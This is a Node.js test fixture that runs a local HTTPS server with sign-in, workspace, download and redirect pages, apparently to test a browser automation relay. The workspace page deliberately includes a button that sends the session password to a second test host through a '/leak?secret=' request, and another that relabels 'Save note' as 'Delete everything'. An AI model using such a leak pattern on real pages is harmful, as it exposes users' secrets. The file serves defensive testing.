// SPDX-License-Identifier: MIT
import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { promisify } from 'node:util';
import { execFile } from 'node:child_process';
import { randomBytes } from 'node:crypto';
import https from 'node:https';

/** Independent HTTPS service. Only acceptance code injects its loopback resolver. */
export async function trustedBrowserFixture({ pageResources = false } = {}) {
  const directory = await mkdtemp(join(tmpdir(), 'relay-trusted-browser-'));
  let server;
  try {
    await promisify(execFile)('openssl', [
      'req',
      '-x509',
      '-newkey',
      'rsa:2048',
      '-nodes',
      '-keyout',
      join(directory, 'key.pem'),
      '-out',
      join(directory, 'cert.pem'),
      '-days',
      '1',
      '-subj',
      '/CN=relay-browser.test',
      '-addext',
      'subjectAltName=DNS:relay-browser.test,DNS:other-browser.test',
    ]);
    const cert = await readFile(join(directory, 'cert.pem'));
    const password = `password_${randomBytes(18).toString('hex')}`,
      session = `session_${randomBytes(18).toString('hex')}`,
      calls = [],
      waitingDownloads = new Set();
    let origin, other;
    server = https.createServer(
      { key: await readFile(join(directory, 'key.pem')), cert },
      async (req, res) => {
        const chunks = [];
        for await (const part of req) chunks.push(part);
        const bytes = Buffer.concat(chunks),
          body = bytes.toString();
        calls.push({
          method: req.method,
          url: req.url,
          host: req.headers.host,
          cookie: req.headers.cookie,
          body,
          bodyHex: bytes.toString('hex'),
        });
        res.setHeader('content-type', 'text/html; charset=utf-8');
        res.setHeader('cache-control', 'no-store');
        if (req.url.startsWith('/page-assets/')) {
          if (req.url.endsWith('.css')) {
            res.setHeader('content-type', 'text/css');
            res.end('body { background: #fafaf7; }');
          } else if (req.url.endsWith('.js')) {
            res.setHeader('content-type', 'application/javascript');
            res.end("document.getElementById('page-details').textContent='Page details loaded';");
          } else {
            res.setHeader('content-type', 'image/svg+xml');
            res.end(
              '<svg xmlns="http://www.w3.org/2000/svg" width="8" height="8"><rect width="8" height="8" fill="#42775a"/></svg>',
            );
          }
          return;
        }
        if (req.url === '/resource-boundaries') {
          res.end(
            `<title>Resource boundaries</title><link rel="icon" href="/page-assets/icon.svg"><link rel="stylesheet" href="/page-assets/style.css"><h1 id="page-details">Loading page details</h1><img src="/page-assets/hero.svg" alt="Leaf"><script src="/page-assets/script.js"></script><img src="${other}/cross-origin.svg" alt="Other site"><iframe title="Separate frame" src="/frame-document"></iframe><script>fetch('/page-api').catch(()=>{})</script><button onclick="var i=new Image();i.src='/later-image.svg'">Load another image</button><form action="/resource-write" method="post"><button>Send form</button></form>`,
          );
          return;
        }
        if (req.url === '/resource-redirect') {
          res.writeHead(302, { location: '/resource-boundaries' });
          res.end();
          return;
        }
        if (
          [
            '/cross-origin.svg',
            '/later-image.svg',
            '/frame-document',
            '/page-api',
            '/resource-write',
          ].includes(req.url)
        ) {
          res.end('<h1>Separate request</h1>');
          return;
        }
        if (req.url === '/favicon.ico') {
          res.writeHead(204);
          res.end();
          return;
        }
        if (req.url === '/signin' && req.method === 'GET') {
          res.end(
            '<title>Sign in</title><h1>Sign in</h1><form action="/signin" method="post"><label>Username <input name="username" autocomplete="username"></label><label>Password <input type="password" name="password" autocomplete="current-password"></label><button>Sign in</button></form>',
          );
          return;
        }
        if (req.url === '/signin' && req.method === 'POST') {
          const data = new URLSearchParams(body);
          if (data.get('password') !== password) {
            res.writeHead(401);
            res.end('<h1>Wrong password</h1>');
            return;
          }
          res.writeHead(303, {
            location: '/workspace',
            'set-cookie': [
              `session=${session}; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600`,
            ],
          });
          res.end();
          return;
        }
        if (!req.headers.cookie?.includes(`session=${session}`)) {
          res.writeHead(401);
          res.end('<h1>Sign in first</h1>');
          return;
        }
        if (req.url === '/workspace') {
          if (pageResources)
            res.write(
              '<link rel="stylesheet" href="/page-assets/style.css"><link rel="icon" href="/page-assets/icon.svg"><img src="/page-assets/hero.svg" alt="Leaf"><p id="page-details">Loading page details</p><script src="/page-assets/script.js"></script>',
            );
          res.end(
            `<title>Private notebook</title><h1>Private notebook</h1><p>Reflected private input: ${password}</p><form action="/save" method="post"><label>Note <input name="note"></label><button id="save">Save note</button></form><label>Private field <input type="password" value="server_supplied_private_value"></label><button onclick="document.getElementById('save').textContent='Delete everything'">Rename button</button><button onclick="setTimeout(()=>fetch('/background').catch(()=>{}),2000)">Schedule background request</button><button onclick="fetch('${other}/leak?secret=${password}',{mode:'no-cors'}).catch(()=>{})">Try cross-origin request</button><button onclick="fetch('/bytes',{method:'POST',headers:{'content-type':'application/octet-stream'},body:new Uint8Array([0,255,128,1])}).catch(()=>{})">Upload bytes</button>`,
          );
          return;
        }
        if (req.url === '/downloads') {
          res.end(
            '<title>Reports</title><h1>Your reports</h1><a href="/export.csv">Download report</a><a href="/raw.bin" download="sample.bin">Download binary</a><a href="/download-redirect">Download through redirect</a><a href="/export-secret">Download private value</a><a href="/export-large">Download oversized file</a>',
          );
          return;
        }
        if (req.url === '/download-redirect') {
          res.writeHead(302, { location: '/export.csv' });
          res.end();
          return;
        }
        if (req.url === '/export-slow') {
          res.setHeader('content-type', 'text/csv');
          res.setHeader('content-disposition', 'attachment; filename="slow.csv"');
          waitingDownloads.add(res);
          res.once('close', () => waitingDownloads.delete(res));
          return;
        }
        if (req.url === '/raw.bin') {
          res.setHeader('content-type', 'application/octet-stream');
          res.end(Buffer.from([0, 255, 128, 7, 0, 11]));
          return;
        }
        if (['/export.csv', '/export-secret', '/export-large'].includes(req.url)) {
          res.setHeader('content-type', 'text/csv; charset=utf-8');
          res.setHeader('content-disposition', 'attachment; filename="report.csv"');
          res.end(
            req.url === '/export-secret'
              ? password
              : req.url === '/export-large'
                ? Buffer.alloc(8_000_001, 65)
                : 'Item,Amount\nTea,4\nTrain,12\n',
          );
          return;
        }
        if (req.url === '/redirect' || req.url === '/redirect-again') {
          res.writeHead(302, {
            location: req.url === '/redirect' ? '/redirect-again' : '/workspace',
          });
          res.end();
          return;
        }
        if (req.url === '/bytes' && req.method === 'POST') {
          res.setHeader('content-type', 'application/json');
          res.end('{"saved":true}');
          return;
        }
        if (req.url === '/keyboard') {
          res.end(
            '<title>Keyboard controls</title><h1>Keyboard controls</h1><form method="post" action="/key-save"><label>Keyboard note <input name="note"></label><label>Category <select name="category"><option value="one">One</option><option value="two">Two</option></select></label><button>Save with keyboard</button></form><h2 style="margin-top:1400px">Bottom of page</h2>',
          );
          return;
        }
        if (req.url === '/key-save' && req.method === 'POST') {
          res.end('<h1>Keyboard note saved</h1>');
          return;
        }
        if (req.url === '/save' && req.method === 'POST') {
          res.end('<title>Saved</title><h1>Note saved</h1>');
          return;
        }
        if (req.url === '/background') {
          res.end('<h1>Background work</h1>');
          return;
        }
        res.writeHead(404);
        res.end('<h1>No such page</h1>');
      },
    );
    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
    origin = `https://relay-browser.test:${server.address().port}`;
    other = `https://other-browser.test:${server.address().port}`;
    const resolver = async (value) => {
      const url = new URL(value);
      if (![origin, other].includes(url.origin)) throw Error('Outside the test fixture');
      return { url, address: '127.0.0.1' };
    };
    return {
      directory,
      cert,
      password,
      session,
      calls,
      origin,
      other,
      resolver,
      releaseDownloads() {
        for (const response of waitingDownloads) response.end('Item,Amount\nLate,99\n');
      },
      async close() {
        await new Promise((r) => {
          server.close(r);
          server.closeAllConnections();
        });
        await rm(directory, { recursive: true, force: true });
      },
    };
  } catch (error) {
    server?.close();
    await rm(directory, { recursive: true, force: true });
    throw error;
  }
}
